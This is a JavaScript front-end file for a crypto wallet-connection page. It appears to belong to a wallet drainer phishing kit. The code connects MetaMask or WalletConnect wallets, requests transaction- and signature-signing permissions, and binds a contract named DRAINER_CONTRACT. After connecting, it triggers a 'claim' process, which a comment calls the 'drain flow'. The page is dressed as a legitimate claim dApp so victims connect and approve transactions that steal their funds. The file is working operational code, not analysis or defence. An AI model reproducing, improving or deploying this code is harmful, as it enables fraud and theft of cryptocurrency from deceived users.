import { CONFIG } from './config.js';

;(async function () {
  // ============================================================
  //  DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 11px; padding: 4px 6px;
    z-index: 10000; max-height: 120px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log(msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}  ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ============================================================
  //  DEVICE DETECTION
  // ============================================================
  const ua = navigator.userAgent;
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(ua); }
  function isAndroid() { return /Android/i.test(ua); }
  function isDesktop() { return !isMobile(); }
  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    return 'desktop';
  }

  // ============================================================
  //  CONFIG EXTRACTION
  // ============================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID,
    SUPPORTED_CHAINS,
  } = CONFIG;

  let projectId = PROJECT_ID;

  // ============================================================
  //  GLOBAL STATE
  // ============================================================
  const state = {
    client: null,
    modal: null,
    SignClient: null,
    WalletConnectModal: null,
    EthereumProvider: null,
    librariesLoaded: false,
    librariesPromise: null,
    isConnecting: false,
    currentSession: null,
    currentProvider: null,     // live provider for sign requests
    currentWeb3: null,
    currentContract: null,
    currentAddress: null,
    currentChain: null,        // 'evm' | 'solana' | 'bitcoin' | null
    wcModalOpenedAt: 0,
  };

  // ============================================================
  //  DOM
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ============================================================
  //  UI HELPERS
  // ============================================================
  function setButtonState(button, stateName) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = stateName === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.25s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
    button.style.minWidth = '180px';
    button.disabled = stateName === 'loading';

    switch (stateName) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666 0%, #888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet';
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  //  PUBLISH TO GLOBAL (script.js reads this)
  // ============================================================
  function publishConnection({ address, chain, web3, contract, provider, session }) {
    state.currentAddress = address;
    state.currentChain   = chain;
    state.currentWeb3    = web3;
    state.currentContract = contract;
    state.currentProvider = provider;
    state.currentSession  = session || null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3 || null,
      contract: contract || null,
      provider: provider || null,
      session:  session || null,
      publishedAt: Date.now(),
    };

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain, provider, web3, contract, session }
    }));
    logDebug(`📡 published __apexConnected: ${chain} ${address}`);
  }

  function clearGlobal() {
    delete window.__apexConnected;
    window.dispatchEvent(new CustomEvent('apex:disconnected'));
    logDebug('📡 cleared __apexConnected');
  }

  // ============================================================
  //  UI: connected address pill
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { evm: '◆ ETH', solana: '◎ SOL', bitcoin: '₿ BTC' };
    const label = chainLabels[chain] || '◆ ETH';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px; padding:10px 16px;
        font-family:'JetBrains Mono', monospace; font-size:14px;
        color:#059669; text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px; border:1px solid #A7F3D0;
        box-shadow:0 2px 8px rgba(5,150,105,0.1);
      `;
      (connectButton || document.body).parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { btn.innerHTML = orig; }, 2000);
      });
    });

    showStatus(`Connected · ${label}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
  }

  // ============================================================
  //  LIBRARY LOADING (single-flight)
  // ============================================================
  async function loadLibraries() {
    if (state.librariesLoaded) return;
    if (state.librariesPromise) return state.librariesPromise;

    state.librariesPromise = (async () => {
      logDebug('Loading WalletConnect libraries…');
      const t0 = Date.now();

      const [SignClientMod, ModalMod, ProviderMod] = await Promise.all([
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/sign-client@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
        ]),
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/modal@2.6.2',
          'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
          'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
        ]),
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
        ]),
      ]);

      state.SignClient          = SignClientMod.default || SignClientMod;
      state.WalletConnectModal  = ModalMod.WalletConnectModal || ModalMod.default || ModalMod;
      state.EthereumProvider    = ProviderMod.EthereumProvider || ProviderMod.default || ProviderMod;

      if (!state.SignClient || !state.WalletConnectModal || !state.EthereumProvider) {
        throw new Error('Failed to load WalletConnect libraries');
      }

      logDebug(`✅ Libraries loaded in ${Date.now() - t0} ms`);
      state.librariesLoaded = true;
    })();

    return state.librariesPromise;
  }

  async function loadFirstAvailable(urls) {
    let lastErr;
    for (const url of urls) {
      try {
        const mod = await import(url);
        logDebug(`✅ loaded ${url.split('/').slice(0, 3).join('/')}`);
        return mod;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${url} → ${e.message}`);
      }
    }
    throw lastErr || new Error('All CDN URLs failed');
  }

  // ============================================================
  //  WALLETCONNECT — SINGLETON INIT
  // ============================================================
  async function ensureWalletConnect() {
    if (state.client && state.modal) return true;
    await loadLibraries();

    try {
      state.client = await state.SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      state.modal = new state.WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18', // Uniswap
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask',      links: { native: 'metamask://',       universal: 'https://metamask.app.link/' } },
          { id: 'trust',    name: 'Trust Wallet',  links: { native: 'trust://',          universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',  name: 'Rainbow',       links: { native: 'rainbow://',        universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase',      links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      });

      logDebug('✅ WalletConnect initialised');

      // Register session listeners once
      state.client.on('session_update', ({ params }) => {
        const acc = params.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (acc) logDebug(`session_update: ${acc}`);
      });
      state.client.on('session_delete', () => {
        logDebug('session_delete');
        resetConnectedUI();
        clearGlobal();
      });

      return true;
    } catch (e) {
      logDebug(`❌ WC init failed: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ============================================================
  const evmProviders = [];
  let eip6963Ready = false;
  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 400);
    setTimeout(request, 1000);
  }

  // ============================================================
  //  DIRECT EVM (desktop first)
  // ============================================================
  async function tryDirectEVM(timeoutMs = 30000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 250));

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected', icon: '', uuid: 'injected' },
        provider: window.ethereum,
      }];
    }
    if (!providers.length) {
      logDebug('Direct EVM: no providers found');
      return false;
    }

    // Prefer MetaMask if present, otherwise first
    const preferred =
      providers.find((p) => p.info.rdns === 'io.metamask') ||
      providers.find((p) => p.info.name.toLowerCase().includes('metamask')) ||
      providers[0];

    logDebug(`Direct EVM: trying ${preferred.info.name} (timeout ${timeoutMs}ms)`);

    try {
      const accounts = await Promise.race([
        preferred.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('Connection timeout')), timeoutMs)),
      ]);

      if (!accounts || !accounts.length) return false;
      const address = accounts[0];

      await importWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(preferred.provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      logDebug(`✅ Direct EVM: ${preferred.info.name} → ${address}`);

      publishConnection({
        address,
        chain: 'evm',
        web3,
        contract,
        provider: preferred.provider,
        session: null,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(preferred.provider);

      return true;
    } catch (e) {
      logDebug(`Direct EVM failed: ${e.message}`);
      return false;
    }
  }

  async function importWeb3() {
    if (window.__Web3__) return window.__Web3__;
    const mod = await import('https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js');
    window.__Web3__ = mod.default || mod;
    return window.__Web3__;
  }

  // ============================================================
  //  WALLETCONNECT EVM
  // ============================================================
  async function tryWalletConnect(timeoutMs = 55_000) {
    if (state.isConnecting) {
      logDebug('WC already connecting');
      return false;
    }
    state.isConnecting = true;

    try {
      const ok = await ensureWalletConnect();
      if (!ok) {
        state.isConnecting = false;
        return false;
      }

      if (state.modal.closeModal) {
        try { state.modal.closeModal(); } catch (e) {}
      }

      showStatus('Requesting wallet connection…', 'info');
      logDebug('WC: creating pairing URI…');

      const { uri, approval } = await state.client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
              'eth_signTypedData',
              'wallet_switchEthereumChain',
            ],
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No WC URI');
      logDebug('WC: opening modal with URI');

      state.wcModalOpenedAt = Date.now();
      state.modal.openModal({ uri });
      showStatus('Scan with your wallet', 'info');

      // Wait for session
      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('WC approval timeout')), timeoutMs)),
      ]);

      try { state.modal.closeModal(); } catch (e) {}

      const accounts = session?.namespaces?.eip155?.accounts || [];
      if (!accounts.length) throw new Error('No accounts in session');
      const address = accounts[0].split(':')[2];
      logDebug(`✅ WC session: ${address}`);

      // Build a live EIP-1193 provider from this session
      const provider = await state.EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
        chains: [MAINNET_ID],
        optionalChains: SUPPORTED_CHAINS,
        showQrModal: false,
        methods: [
          'eth_sendTransaction',
          'personal_sign',
          'eth_signTypedData_v4',
          'eth_signTypedData',
        ],
        events: ['chainChanged', 'accountsChanged'],
      });

      // Verify provider returns the same account
      try {
        const provAccounts = await provider.request({ method: 'eth_accounts' });
        logDebug(`WC provider accounts: ${provAccounts?.length || 0}`);
      } catch (e) {
        logDebug(`WC provider eth_accounts failed: ${e.message}`);
      }

      await importWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      publishConnection({
        address,
        chain: 'evm',
        web3,
        contract,
        provider,
        session,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(provider);

      state.isConnecting = false;
      return true;
    } catch (e) {
      logDebug(`❌ WC failed: ${e.message}`);
      try { state.modal?.closeModal(); } catch (_) {}
      if (/reject|cancel/i.test(e.message)) {
        showStatus('Connection cancelled', 'error');
      } else if (/timeout/i.test(e.message)) {
        showStatus('WalletConnect timeout — try again', 'error');
      } else {
        showStatus('Wallet connection failed', 'error');
      }
      state.isConnecting = false;
      return false;
    }
  }

  // ============================================================
  //  EVM LISTENERS
  // ============================================================
  function attachEVMListeners(provider) {
    if (!provider || provider.__apexListeners) return;
    provider.__apexListeners = true;

    provider.on?.('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearGlobal();
        return;
      }
      const addr = accounts[0];
      logDebug(`accountsChanged: ${addr}`);
      publishConnection({
        address: addr,
        chain: 'evm',
        web3: state.currentWeb3,
        contract: state.currentContract,
        provider,
        session: state.currentSession,
      });
      updateConnectedUI(addr, 'evm');
    });

    provider.on?.('chainChanged', (chainId) => {
      logDebug(`chainChanged: ${chainId}`);
      showStatus(`Network changed to ${parseInt(chainId, 16)}`, 'info');
    });

    provider.on?.('disconnect', () => {
      logDebug('provider disconnect');
      resetConnectedUI();
      clearGlobal();
    });
  }

  // ============================================================
  //  MOBILE SCROLL
  // ============================================================
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  async function disconnect() {
    try {
      if (state.client && state.currentSession) {
        await state.client.disconnect({
          topic: state.currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (state.currentProvider?.disconnect) {
        await state.currentProvider.disconnect();
      }
    } catch (e) {
      logDebug(`disconnect error: ${e.message}`);
    }
    resetConnectedUI();
    clearGlobal();
    state.currentSession = null;
    state.currentProvider = null;
    state.currentWeb3 = null;
    state.currentContract = null;
    state.currentAddress = null;
    state.currentChain = null;
  }

  // ============================================================
  //  MAIN CONNECT
  // ============================================================
  async function connect() {
    if (state.isConnecting) {
      logDebug('Already connecting');
      return;
    }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    const t0 = Date.now();

    if (isMobile()) {
      // ── Mobile: WalletConnect only, must open modal fast ──
      logDebug('📱 mobile → WalletConnect');
      const ok = await tryWalletConnect(55_000);
      if (!ok) {
        showStatus('Could not connect. Try again.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
        return;
      }
      logDebug(`✅ mobile connected in ${Date.now() - t0} ms`);
    } else {
      // ── Desktop: direct first, then WalletConnect ──
      logDebug('🖥️ desktop → direct EVM first');
      const direct = await tryDirectEVM(30_000);
      if (!direct) {
        logDebug('Direct failed → WalletConnect');
        const ok = await tryWalletConnect(60_000);
        if (!ok) {
          showStatus('No wallet found. Install MetaMask or use WalletConnect.', 'error');
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
          return;
        }
      }
      logDebug(`✅ desktop connected in ${Date.now() - t0} ms`);
    }

    if (walletButton) setButtonState(walletButton, 'connected');
    setButtonState(connectButton, 'connected');

    // Dispatch event so script.js begins the drain flow
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1200);
  }

  // ============================================================
  //  CLICK HANDLER
  // ============================================================
  const onClick = async () => {
    const saved = window.__apexConnected?.address || localStorage.getItem('apex.address');
    if (saved) {
      await disconnect();
    } else {
      await connect();
    }
  };

  if (connectButton) connectButton.addEventListener('click', onClick);
  if (walletButton)  walletButton.addEventListener('click',  onClick);

  // ============================================================
  //  RESTORE ON LOAD
  // ============================================================
  async function restoreSession() {
    const savedAddress = localStorage.getItem('apex.address');
    const savedChain   = localStorage.getItem('apex.chain') || 'evm';
    const savedTopic   = localStorage.getItem('apex.topic');

    if (!savedAddress) {
      logDebug('No saved session');
      return;
    }

    logDebug(`Restoring ${savedChain}: ${savedAddress}`);

    if (savedChain === 'evm' && savedTopic) {
      try {
        const ok = await ensureWalletConnect();
        if (ok) {
          const session = state.client.session.get(savedTopic);
          if (session) {
            const provider = await state.EthereumProvider.init({
              projectId,
              metadata: DAPP_METADATA,
              session,
              chains: [MAINNET_ID],
              optionalChains: SUPPORTED_CHAINS,
              showQrModal: false,
            });
            await importWeb3();
            const Web3 = window.__Web3__;
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

            publishConnection({
              address: savedAddress,
              chain: 'evm',
              web3,
              contract,
              provider,
              session,
            });
            updateConnectedUI(savedAddress, 'evm');
            attachEVMListeners(provider);
            return;
          }
          logDebug('Saved session not found — clearing');
          localStorage.removeItem('apex.topic');
        }
      } catch (e) {
        logDebug(`Restore failed: ${e.message}`);
      }
    }

    if (savedChain === 'evm' && isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts[0] === savedAddress) {
          await importWeb3();
          const Web3 = window.__Web3__;
          const web3 = new Web3(window.ethereum);
          const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishConnection({
            address: savedAddress,
            chain: 'evm',
            web3,
            contract,
            provider: window.ethereum,
            session: null,
          });
          updateConnectedUI(savedAddress, 'evm');
          attachEVMListeners(window.ethereum);
          return;
        }
      } catch (e) {
        logDebug(`Injected restore failed: ${e.message}`);
      }
    }

    // Nothing to restore — clear stale
    localStorage.removeItem('apex.address');
    localStorage.removeItem('apex.chain');
    localStorage.removeItem('apex.topic');
  }

  // Persist on connect
  window.addEventListener('apex:connected', (ev) => {
    const { address, chain, session } = ev.detail;
    localStorage.setItem('apex.address', address);
    localStorage.setItem('apex.chain', chain);
    if (session?.topic) localStorage.setItem('apex.topic', session.topic);
  });
  window.addEventListener('apex:disconnected', () => {
    localStorage.removeItem('apex.address');
    localStorage.removeItem('apex.chain');
    localStorage.removeItem('apex.topic');
  });

  // ============================================================
  //  VISIBILITY (mobile WalletConnect return)
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!isMobile()) return;
    if (!state.client) return;

    logDebug('👁 visibility: checking for WC session return…');
    setTimeout(async () => {
      try {
        const sessions = state.client.session.values();
        if (!sessions.length) return;
        const session = sessions[0];
        const addr = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (!addr) return;
        if (window.__apexConnected?.address === addr) return;

        logDebug(`🎯 session returned from visibility: ${addr}`);
        const provider = await state.EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          session,
          chains: [MAINNET_ID],
          optionalChains: SUPPORTED_CHAINS,
          showQrModal: false,
        });
        await importWeb3();
        const Web3 = window.__Web3__;
        const web3 = new Web3(provider);
        const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishConnection({ address: addr, chain: 'evm', web3, contract, provider, session });
        updateConnectedUI(addr, 'evm');
        attachEVMListeners(provider);
        try { state.modal?.closeModal(); } catch (_) {}
      } catch (e) {
        logDebug(`visibility restore failed: ${e.message}`);
      }
    }, 800);
  });

  // ============================================================
  //  BOOT
  // ============================================================
  try {
    // Preload WC libraries in the background so mobile modal is instant
    loadLibraries().catch((e) => logDebug(`preload: ${e.message}`));
    await restoreSession();
  } catch (e) {
    logDebug(`boot error: ${e.message}`);
  }

  logDebug(`✅ main.js ready · platform=${getPlatform()} mobile=${isMobile()} desktop=${isDesktop()}`);
})();
